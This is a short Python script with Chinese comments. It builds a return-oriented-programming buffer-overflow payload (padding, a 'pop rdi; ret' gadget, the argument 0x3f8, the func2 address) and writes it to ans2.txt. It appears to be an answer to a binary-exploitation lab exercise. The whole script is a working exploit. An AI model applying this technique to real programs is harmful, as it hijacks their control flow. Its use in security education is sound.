# 1. Padding 依然是 16 字节
padding = b"A" * 16

# 2. Gadget 地址：0x4012c7 (pop rdi; ret)
pop_rdi_addr = b"\xc7\x12\x40\x00\x00\x00\x00\x00"

# 3. 参数值：0x3f8 (十进制 1016)
arg_value = b"\xf8\x03\x00\x00\x00\x00\x00\x00"

# 4. 目标函数：func2 地址 0x401216
func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

# 5. 组装 ROP 链
# 这里的逻辑是：
# 覆盖返回地址 -> 跳去执行 pop rdi -> 栈顶变成了 0x3f8 被 pop 进 rdi -> pop 完后栈顶变成了 func2 -> ret 跳进 func2
payload = padding + pop_rdi_addr + arg_value + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans2.txt")